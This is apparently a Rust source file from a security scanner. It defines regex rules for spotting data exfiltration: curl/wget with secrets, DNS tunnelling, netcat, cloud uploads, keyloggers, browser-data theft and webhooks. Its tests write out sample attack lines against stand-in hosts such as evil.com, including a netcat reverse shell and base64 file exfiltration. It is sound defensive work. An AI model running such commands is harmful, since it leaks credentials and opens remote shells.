use crate::rules::types::{Category, Confidence, Rule, Severity};
use regex::Regex;

pub fn rules() -> Vec<Rule> {
    vec![
        ex_001(),
        ex_002(),
        ex_003(),
        ex_005(),
        ex_006(),
        ex_007(),
        ex_008(),
        ex_009(),
        ex_010(),
        ex_011(),
        ex_012(),
        ex_013(),
        ex_014(),
    ]
}

fn ex_001() -> Rule {
    Rule {
        id: "EX-001",
        name: "Network request with environment variable",
        description: "Detects curl/wget commands that include environment variables, potentially exfiltrating sensitive data",
        severity: Severity::Critical,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            // Uppercase environment variables: $API_KEY, $SECRET
            Regex::new(r"(curl|wget)\s+.*\$[A-Z_][A-Z0-9_]*").expect("EX-001: invalid regex"),
            // Uppercase ${} form: ${API_KEY}
            Regex::new(r"(curl|wget)\s+.*\$\{[A-Z_][A-Z0-9_]*\}").expect("EX-001: invalid regex"),
            // Lowercase environment variables: $api_key, $secret (common in scripts)
            Regex::new(r"(curl|wget)\s+.*\$[a-z_][a-z0-9_]*").expect("EX-001: invalid regex"),
            // Lowercase ${} form: ${api_key}
            Regex::new(r"(curl|wget)\s+.*\$\{[a-z_][a-z0-9_]*\}").expect("EX-001: invalid regex"),
            // Mixed case ${} form: ${ApiKey}, ${apiKey}
            Regex::new(r"(curl|wget)\s+.*\$\{[A-Za-z_][A-Za-z0-9_]*\}")
                .expect("EX-001: invalid regex"),
            // Command substitution: $(get_token), $(cat /etc/passwd)
            Regex::new(r"(curl|wget)\s+.*\$\([^)]+\)").expect("EX-001: invalid regex"),
            // Backtick command substitution: `get_token`
            Regex::new(r"(curl|wget)\s+.*`[^`]+`").expect("EX-001: invalid regex"),
        ],
        exclusions: vec![
            // Local/internal hosts
            Regex::new(r"localhost|127\.0\.0\.1|::1|\[::1\]").expect("EX-001: invalid regex"),
            // Major Git hosting platforms (common in CI/CD)
            Regex::new(r"(?i)github\.com|gitlab\.com|bitbucket\.org|api\.github\.com")
                .expect("EX-001: invalid regex"),
            // Container registries
            Regex::new(r"(?i)docker\.io|gcr\.io|quay\.io|registry\.|\.azurecr\.io|\.ecr\.")
                .expect("EX-001: invalid regex"),
            // Package registries
            Regex::new(r"(?i)registry\.npmjs\.org|pypi\.org|crates\.io|rubygems\.org")
                .expect("EX-001: invalid regex"),
            // Proxy environment variables (legitimate use)
            Regex::new(r"(?i)\$HTTP_PROXY|\$HTTPS_PROXY|\$NO_PROXY|\$ALL_PROXY")
                .expect("EX-001: invalid regex"),
            // Authorization headers (common API pattern)
            Regex::new(r#"-H\s*["']Authorization:"#).expect("EX-001: invalid regex"),
            // Version/tag variables (common in CI)
            Regex::new(r"(?i)\$VERSION|\$TAG|\$BRANCH|\$BUILD").expect("EX-001: invalid regex"),
            // CI/CD service URLs
            Regex::new(r"(?i)circleci|travis-ci|jenkins|actions/").expect("EX-001: invalid regex"),
        ],
        message: "Potential data exfiltration: network request with environment variable detected",
        recommendation: "Review the command and ensure no sensitive data is being sent externally",
        fix_hint: Some(
            "Use environment variable references without exposing them: ${VAR:-default}",
        ),
        cwe_ids: &["CWE-200", "CWE-319"],
    }
}

fn ex_002() -> Rule {
    Rule {
        id: "EX-002",
        name: "Base64 encoded network transmission",
        description: "Detects base64 encoding combined with network transmission, often used to obfuscate data exfiltration",
        severity: Severity::Critical,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            Regex::new(r"base64.*\|\s*(curl|wget|nc|netcat)").expect("EX-002: invalid regex"),
            Regex::new(r"(curl|wget|nc|netcat).*base64").expect("EX-002: invalid regex"),
            Regex::new(r"base64.*https?://").expect("EX-002: invalid regex"),
        ],
        exclusions: vec![Regex::new(r"localhost|127\.0\.0\.1|::1").expect("EX-002: invalid regex")],
        message: "Potential data exfiltration: base64 encoding with network transmission detected",
        recommendation: "Investigate why data is being base64 encoded before network transmission",
        fix_hint: None,
        cwe_ids: &["CWE-200", "CWE-319"],
    }
}

fn ex_003() -> Rule {
    Rule {
        id: "EX-003",
        name: "DNS-based data exfiltration",
        description: "Detects DNS queries that may be used for data exfiltration (DNS tunneling)",
        severity: Severity::High,
        category: Category::Exfiltration,
        confidence: Confidence::Tentative,
        patterns: vec![
            // dig/nslookup with variable data in subdomain
            Regex::new(r"\b(dig|nslookup|host)\s+.*\$").expect("EX-003: invalid regex"),
            // Common DNS exfil patterns with command substitution
            Regex::new(r"\$\([^)]+\)\.[a-zA-Z0-9-]+\.(com|net|org|io)\b")
                .expect("EX-003: invalid regex"),
            // ping with uppercase variable subdomain
            Regex::new(r"ping\s+.*\$[A-Z_][A-Z0-9_]*.*\.").expect("EX-003: invalid regex"),
            // ping with lowercase variable subdomain
            Regex::new(r"ping\s+.*\$[a-z_][a-z0-9_]*.*\.").expect("EX-003: invalid regex"),
            // dig with TXT record query (common exfil technique)
            Regex::new(r"\bdig\s+.*TXT\s+.*\$").expect("EX-003: invalid regex"),
            // nslookup with type specification
            Regex::new(r"\bnslookup\s+-type=(txt|any|mx)\s+.*\$").expect("EX-003: invalid regex"),
            // DNS over HTTPS exfiltration
            Regex::new(r"(curl|wget)\s+.*dns\.google|cloudflare-dns\.com")
                .expect("EX-003: invalid regex"),
            // Encoded subdomain pattern (hex, base32)
            Regex::new(r"\b(dig|nslookup)\s+[a-f0-9]{16,}\.").expect("EX-003: invalid regex"),
        ],
        exclusions: vec![
            // Legitimate DNS lookups
            Regex::new(r"(?i)localhost|127\.0\.0\.1").expect("EX-003: invalid regex"),
        ],
        message: "Potential DNS-based data exfiltration: data encoded in DNS query detected",
        recommendation: "Review DNS queries and ensure they are not being used to exfiltrate data",
        fix_hint: None,
        cwe_ids: &["CWE-200", "CWE-319"],
    }
}

fn ex_005() -> Rule {
    Rule {
        id: "EX-005",
        name: "Netcat outbound connection",
        description: "Detects netcat (nc) commands that may establish outbound connections for data exfiltration",
        severity: Severity::Critical,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            Regex::new(r"\b(nc|netcat)\s+(-[a-zA-Z]*\s+)*[a-zA-Z0-9.-]+\s+\d+")
                .expect("EX-005: invalid regex"),
            Regex::new(r"\b(nc|netcat)\s+.*-e").expect("EX-005: invalid regex"),
        ],
        exclusions: vec![
            Regex::new(r"localhost|127\.0\.0\.1|::1").expect("EX-005: invalid regex"),
            Regex::new(r"-l\s").expect("EX-005: invalid regex"), // listening mode is less suspicious
        ],
        message: "Potential data exfiltration: netcat outbound connection detected",
        recommendation: "Review the netcat usage and ensure it's not being used for data exfiltration",
        fix_hint: Some("Remove netcat commands or use established APIs for network communication"),
        cwe_ids: &["CWE-200", "CWE-94"],
    }
}

fn ex_006() -> Rule {
    Rule {
        id: "EX-006",
        name: "Alternative protocol exfiltration",
        description: "Detects data exfiltration via alternative protocols (FTP, SCP, TFTP, SMTP, IRC)",
        severity: Severity::Critical,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            // FTP upload with credentials or data
            Regex::new(r"curl\s+-T.*ftp://").expect("EX-006: invalid regex"),
            Regex::new(r"ftp\s+-n.*<<").expect("EX-006: invalid regex"),
            // SCP/SFTP with uppercase sensitive data
            Regex::new(r"scp\s+.*\$[A-Z_]").expect("EX-006: invalid regex"),
            // SCP/SFTP with lowercase sensitive data
            Regex::new(r"scp\s+.*\$[a-z_]").expect("EX-006: invalid regex"),
            // SCP/SFTP with ${} form
            Regex::new(r"scp\s+.*\$\{[A-Za-z_]").expect("EX-006: invalid regex"),
            Regex::new(r"sftp.*<<<").expect("EX-006: invalid regex"),
            // TFTP
            Regex::new(r"tftp\s+.*-c\s*(put|get)").expect("EX-006: invalid regex"),
            // sendmail/mail with data
            Regex::new(r"(sendmail|mail)\s+.*<<<.*\$").expect("EX-006: invalid regex"),
            Regex::new(r"(sendmail|mail).*<<.*EOF").expect("EX-006: invalid regex"),
            // IRC exfiltration (uppercase)
            Regex::new(r"PRIVMSG.*\$[A-Z_]").expect("EX-006: invalid regex"),
            // IRC exfiltration (lowercase)
            Regex::new(r"PRIVMSG.*\$[a-z_]").expect("EX-006: invalid regex"),
            // WebSocket connections
            Regex::new(r#"WebSocket\s*\(\s*['"]wss?://"#).expect("EX-006: invalid regex"),
            Regex::new(r"wscat\s+-c").expect("EX-006: invalid regex"),
            // socat for data transfer
            Regex::new(r"socat\s+.*TCP:").expect("EX-006: invalid regex"),
            // telnet with data
            Regex::new(r"telnet\s+.*\|\s*(bash|sh)").expect("EX-006: invalid regex"),
            // rsync with sensitive data
            Regex::new(r"rsync\s+.*\$[A-Za-z_]").expect("EX-006: invalid regex"),
        ],
        exclusions: vec![
            Regex::new(r"localhost|127\.0\.0\.1").expect("EX-006: invalid regex"),
            Regex::new(r"^\s*#").expect("EX-006: invalid regex"),
        ],
        message: "Alternative protocol exfiltration detected. Data may be sent via FTP, SCP, SMTP, or other protocols.",
        recommendation: "Review the command and ensure no sensitive data is being transmitted via alternative protocols.",
        fix_hint: Some("Use secure, auditable APIs instead of raw protocol commands."),
        cwe_ids: &["CWE-200", "CWE-319"],
    }
}

fn ex_007() -> Rule {
    Rule {
        id: "EX-007",
        name: "Cloud storage exfiltration",
        description: "Detects potential data exfiltration via cloud storage services (S3, GCS, Azure)",
        severity: Severity::High,
        category: Category::Exfiltration,
        confidence: Confidence::Tentative,
        patterns: vec![
            // AWS S3 uploads with sensitive data (uppercase)
            Regex::new(r"aws\s+s3\s+(cp|mv|sync).*\$[A-Z_]").expect("EX-007: invalid regex"),
            // AWS S3 uploads with sensitive data (lowercase)
            Regex::new(r"aws\s+s3\s+(cp|mv|sync).*\$[a-z_]").expect("EX-007: invalid regex"),
            // AWS S3 uploads with ${} form
            Regex::new(r"aws\s+s3\s+(cp|mv|sync).*\$\{[A-Za-z_]").expect("EX-007: invalid regex"),
            // AWS S3 with process substitution
            Regex::new(r"aws\s+s3\s+(cp|mv|sync).*<\(").expect("EX-007: invalid regex"),
            // GCS uploads (uppercase)
            Regex::new(r"gsutil\s+(cp|mv|rsync).*\$[A-Z_]").expect("EX-007: invalid regex"),
            // GCS uploads (lowercase)
            Regex::new(r"gsutil\s+(cp|mv|rsync).*\$[a-z_]").expect("EX-007: invalid regex"),
            // Azure blob uploads (uppercase)
            Regex::new(r"az\s+storage\s+blob\s+upload.*\$[A-Z_]").expect("EX-007: invalid regex"),
            // Azure blob uploads (lowercase)
            Regex::new(r"az\s+storage\s+blob\s+upload.*\$[a-z_]").expect("EX-007: invalid regex"),
            // rclone (multi-cloud, uppercase)
            Regex::new(r"rclone\s+(copy|sync|move).*\$[A-Z_]").expect("EX-007: invalid regex"),
            // rclone (multi-cloud, lowercase)
            Regex::new(r"rclone\s+(copy|sync|move).*\$[a-z_]").expect("EX-007: invalid regex"),
            // GitHub/GitLab exfiltration via commits
            Regex::new(r"git\s+config\s+user\.(email|name).*\$[A-Za-z_]")
                .expect("EX-007: invalid regex"),
            // Pastebin-style services
            Regex::new(r"(curl|wget).*(paste|hastebin|sprunge|ix\.io|termbin)")
                .expect("EX-007: invalid regex"),
            // GitHub Gist exfiltration
            Regex::new(r"(curl|wget).*api\.github\.com/gists").expect("EX-007: invalid regex"),
        ],
        exclusions: vec![
            Regex::new(r"localhost|127\.0\.0\.1").expect("EX-007: invalid regex"),
            Regex::new(r"^\s*#").expect("EX-007: invalid regex"),
        ],
        message: "Cloud storage exfiltration pattern detected. Sensitive data may be uploaded to cloud services.",
        recommendation: "Review cloud storage operations and ensure no sensitive data is being exfiltrated.",
        fix_hint: Some("Avoid uploading sensitive data to external cloud storage."),
        cwe_ids: &["CWE-200", "CWE-319"],
    }
}

fn ex_008() -> Rule {
    Rule {
        id: "EX-008",
        name: "Screenshot capture",
        description: "Detects screenshot capture capabilities that may exfiltrate visual data",
        severity: Severity::High,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            // macOS screenshot
            Regex::new(r"screencapture\s+-").expect("EX-008: invalid regex"),
            // Linux scrot/import
            Regex::new(r"\b(scrot|import\s+-window)\b").expect("EX-008: invalid regex"),
            // Windows screenshot
            Regex::new(r"nircmd.*savescreenshot").expect("EX-008: invalid regex"),
            // Python screenshot libraries
            Regex::new(r"(pyautogui|pyscreenshot|mss)\.screenshot").expect("EX-008: invalid regex"),
            // Node.js screenshot
            Regex::new(r"screenshot-desktop|desktop-screenshot").expect("EX-008: invalid regex"),
        ],
        exclusions: vec![],
        message: "Screenshot capture detected. Visual data may be exfiltrated.",
        recommendation: "Review screenshot functionality and ensure it's not used for data exfiltration.",
        fix_hint: Some("Remove screenshot capture unless explicitly required"),
        cwe_ids: &["CWE-200"],
    }
}

fn ex_009() -> Rule {
    Rule {
        id: "EX-009",
        name: "Clipboard access",
        description: "Detects clipboard read operations that may access sensitive data",
        severity: Severity::High,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            // macOS clipboard
            Regex::new(r"pbpaste").expect("EX-009: invalid regex"),
            // Linux clipboard
            Regex::new(r"xclip\s+-o|xsel\s+-o").expect("EX-009: invalid regex"),
            // Windows clipboard
            Regex::new(r"Get-Clipboard|powershell.*clipboard").expect("EX-009: invalid regex"),
            // Python clipboard
            Regex::new(r"(pyperclip|clipboard)\.paste\(\)").expect("EX-009: invalid regex"),
            // Node.js clipboard
            Regex::new(r"clipboardy\.read|clipboard\.readSync").expect("EX-009: invalid regex"),
        ],
        exclusions: vec![],
        message: "Clipboard read access detected. Sensitive data from clipboard may be exfiltrated.",
        recommendation: "Review clipboard access and ensure it's not used for data theft.",
        fix_hint: Some("Remove clipboard read unless explicitly required"),
        cwe_ids: &["CWE-200"],
    }
}

fn ex_010() -> Rule {
    Rule {
        id: "EX-010",
        name: "Keylogger pattern",
        description: "Detects patterns associated with keyboard input capture (keylogging)",
        severity: Severity::Critical,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            // Python keylogger libraries
            Regex::new(r"pynput\.keyboard|keyboard\.on_press").expect("EX-010: invalid regex"),
            // Node.js keyboard capture
            Regex::new(r"iohook|node-global-key-listener").expect("EX-010: invalid regex"),
            // Linux input device access
            Regex::new(r"/dev/input/event\d+").expect("EX-010: invalid regex"),
            // Windows hook patterns
            Regex::new(r"SetWindowsHookEx|GetAsyncKeyState").expect("EX-010: invalid regex"),
        ],
        exclusions: vec![Regex::new(r"test|mock|example").expect("EX-010: invalid regex")],
        message: "Keylogger pattern detected. Keyboard input may be captured and exfiltrated.",
        recommendation: "Remove keyboard capture functionality unless it's a legitimate feature.",
        fix_hint: Some("Remove keyboard hooking code"),
        cwe_ids: &["CWE-200", "CWE-319"],
    }
}

fn ex_011() -> Rule {
    Rule {
        id: "EX-011",
        name: "Browser data access",
        description: "Detects access to browser history, cookies, or passwords",
        severity: Severity::Critical,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            // Chrome data paths
            Regex::new(r"Chrome/User Data|\.config/google-chrome").expect("EX-011: invalid regex"),
            // Firefox data paths
            Regex::new(r"\.mozilla/firefox|places\.sqlite|logins\.json")
                .expect("EX-011: invalid regex"),
            // Safari data
            Regex::new(r"Library/Safari/History\.db|Library/Cookies")
                .expect("EX-011: invalid regex"),
            // Generic browser data patterns
            Regex::new(r"(Login Data|Cookies|History)\s*sqlite").expect("EX-011: invalid regex"),
        ],
        exclusions: vec![
            Regex::new(r"test|mock|example|documentation").expect("EX-011: invalid regex"),
        ],
        message: "Browser data access detected. Browser history, cookies, or passwords may be stolen.",
        recommendation: "Remove browser data access unless it's a legitimate browser-related tool.",
        fix_hint: Some("Remove browser data access code"),
        cwe_ids: &["CWE-200", "CWE-522"],
    }
}

fn ex_012() -> Rule {
    Rule {
        id: "EX-012",
        name: "Camera/microphone access",
        description: "Detects access to camera or microphone that may capture audio/video",
        severity: Severity::High,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            // FFmpeg capture
            Regex::new(r"ffmpeg.*-f\s+(avfoundation|v4l2|alsa|pulse)")
                .expect("EX-012: invalid regex"),
            // macOS camera/mic
            Regex::new(r"imagesnap|AVCaptureDevice").expect("EX-012: invalid regex"),
            // Linux video/audio devices
            Regex::new(r"/dev/video\d+|/dev/snd/").expect("EX-012: invalid regex"),
            // Python camera libraries
            Regex::new(r"cv2\.VideoCapture|picamera").expect("EX-012: invalid regex"),
            // Browser media APIs
            Regex::new(r"getUserMedia|mediaDevices").expect("EX-012: invalid regex"),
        ],
        exclusions: vec![Regex::new(r"test|mock|example").expect("EX-012: invalid regex")],
        message: "Camera/microphone access detected. Audio or video may be captured and exfiltrated.",
        recommendation: "Review media capture functionality and ensure it's not used for surveillance.",
        fix_hint: Some("Remove camera/microphone access unless explicitly required"),
        cwe_ids: &["CWE-200"],
    }
}

fn ex_013() -> Rule {
    Rule {
        id: "EX-013",
        name: "Webhook data exfiltration",
        description: "Detects data being sent to webhook endpoints, potentially exfiltrating sensitive information",
        severity: Severity::High,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            // Generic webhook patterns
            Regex::new(r"(curl|wget|fetch|axios|request).*webhook").expect("EX-013: invalid regex"),
            Regex::new(r"webhook\.(site|com|io)").expect("EX-013: invalid regex"),
            // POST to webhook endpoints
            Regex::new(r#"(curl|wget)\s+.*-X\s*POST.*webhook"#).expect("EX-013: invalid regex"),
            Regex::new(r#"(curl|wget)\s+.*--data.*webhook"#).expect("EX-013: invalid regex"),
            // n8n, Zapier, Make (Integromat) webhooks
            Regex::new(r"hooks\.(n8n|zapier|make|integromat)").expect("EX-013: invalid regex"),
            // Pipedream webhooks
            Regex::new(r"pipedream\.net").expect("EX-013: invalid regex"),
            // IFTTT webhooks
            Regex::new(r"maker\.ifttt\.com/trigger").expect("EX-013: invalid regex"),
            // RequestBin style services
            Regex::new(r"(requestbin|hookbin|requestcatcher)").expect("EX-013: invalid regex"),
        ],
        exclusions: vec![
            Regex::new(r"localhost|127\.0\.0\.1").expect("EX-013: invalid regex"),
            Regex::new(r"^\s*#").expect("EX-013: invalid regex"),
        ],
        message: "Webhook data exfiltration detected. Sensitive data may be sent to external webhook services.",
        recommendation: "Review webhook usage and ensure no sensitive data is being transmitted.",
        fix_hint: Some("Remove webhook calls or ensure only non-sensitive data is transmitted"),
        cwe_ids: &["CWE-200", "CWE-319"],
    }
}

fn ex_014() -> Rule {
    Rule {
        id: "EX-014",
        name: "Discord/Slack webhook abuse",
        description: "Detects data being sent to Discord or Slack webhooks, commonly abused for data exfiltration",
        severity: Severity::High,
        category: Category::Exfiltration,
        confidence: Confidence::Firm,
        patterns: vec![
            // Discord webhooks
            Regex::new(r"discord(app)?\.com/api/webhooks/").expect("EX-014: invalid regex"),
            Regex::new(r#"(curl|wget|fetch).*discord.*webhook"#).expect("EX-014: invalid regex"),
            // Slack webhooks
            Regex::new(r"hooks\.slack\.com/services/").expect("EX-014: invalid regex"),
            Regex::new(r#"(curl|wget|fetch).*slack.*webhook"#).expect("EX-014: invalid regex"),
            // Microsoft Teams webhooks
            Regex::new(r"webhook\.office\.com").expect("EX-014: invalid regex"),
            Regex::new(r"teams\.microsoft\.com.*webhook").expect("EX-014: invalid regex"),
            // Telegram bot API (often abused)
            Regex::new(r"api\.telegram\.org/bot.*sendMessage").expect("EX-014: invalid regex"),
            Regex::new(r"api\.telegram\.org/bot.*sendDocument").expect("EX-014: invalid regex"),
        ],
        exclusions: vec![
            Regex::new(r"^\s*#").expect("EX-014: invalid regex"),
            Regex::new(r"test|example|demo").expect("EX-014: invalid regex"),
        ],
        message: "Discord/Slack/Teams webhook detected. These are commonly abused for data exfiltration.",
        recommendation: "Remove messaging webhook integrations or ensure they don't transmit sensitive data.",
        fix_hint: Some("Remove webhook URLs or use authenticated, auditable notification channels"),
        cwe_ids: &["CWE-200", "CWE-319"],
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ex_001_detects_curl_with_env() {
        let rule = ex_001();
        let test_cases = vec![
            (r#"curl https://evil.com?key=$API_KEY"#, true),
            (r#"curl -d "$SECRET" https://attacker.com"#, true),
            (r#"wget https://evil.com/$HOME"#, true),
            (r#"curl http://localhost:3000"#, false),
            (r#"curl https://api.github.com"#, false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
            let result = matched && !excluded;
            assert_eq!(result, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_ex_002_detects_base64_network() {
        let rule = ex_002();
        let test_cases = vec![
            (
                "cat secret.txt | base64 | curl -d @- https://evil.com",
                true,
            ),
            ("curl https://example.com | base64", true),
            ("base64 file.txt", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            assert_eq!(matched, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_ex_003_detects_dns_exfil() {
        let rule = ex_003();
        let test_cases = vec![
            ("dig $DATA.evil.com", true),
            ("nslookup $SECRET.attacker.io", true),
            ("host $ENCODED.malicious.net", true),
            ("ping $TOKEN.evil.org", true),
            ("dig example.com", false),
            ("nslookup google.com", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            assert_eq!(matched, should_match, "Failed for input: {}", input);
        }
    }

    #[test]
    fn test_ex_005_detects_netcat() {
        let rule = ex_005();
        let test_cases = vec![
            ("nc evil.com 4444", true),
            ("netcat -e /bin/sh attacker.com 1234", true),
            ("nc -l 8080", false), // listening mode excluded
            ("nc localhost 3000", false),
        ];

        for (input, should_match) in test_cases {
            let matched = rule.patterns.iter().any(|p| p.is_match(input));
            let excluded = rule.exclusions.iter().any(|e| e.is_match(input));
            let result = matched && !excluded;
            assert_eq!(result, should_match, "Failed for input: {}", input);
        }
    }

    // Snapshot tests
    #[test]
    fn snapshot_ex_001() {
        let rule = ex_001();
        let content = include_str!("../../../tests/fixtures/rules/ex_001.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("ex_001", findings);
    }

    #[test]
    fn snapshot_ex_002() {
        let rule = ex_002();
        let content = include_str!("../../../tests/fixtures/rules/ex_002.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("ex_002", findings);
    }

    #[test]
    fn snapshot_ex_003() {
        let rule = ex_003();
        let content = include_str!("../../../tests/fixtures/rules/ex_003.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("ex_003", findings);
    }

    #[test]
    fn snapshot_ex_005() {
        let rule = ex_005();
        let content = include_str!("../../../tests/fixtures/rules/ex_005.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("ex_005", findings);
    }

    #[test]
    fn snapshot_ex_006() {
        let rule = ex_006();
        let content = include_str!("../../../tests/fixtures/rules/ex_006.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("ex_006", findings);
    }

    #[test]
    fn snapshot_ex_007() {
        let rule = ex_007();
        let content = include_str!("../../../tests/fixtures/rules/ex_007.txt");
        let findings = crate::rules::snapshot_test::scan_with_rule(&rule, content);
        crate::assert_rule_snapshot!("ex_007", findings);
    }
}
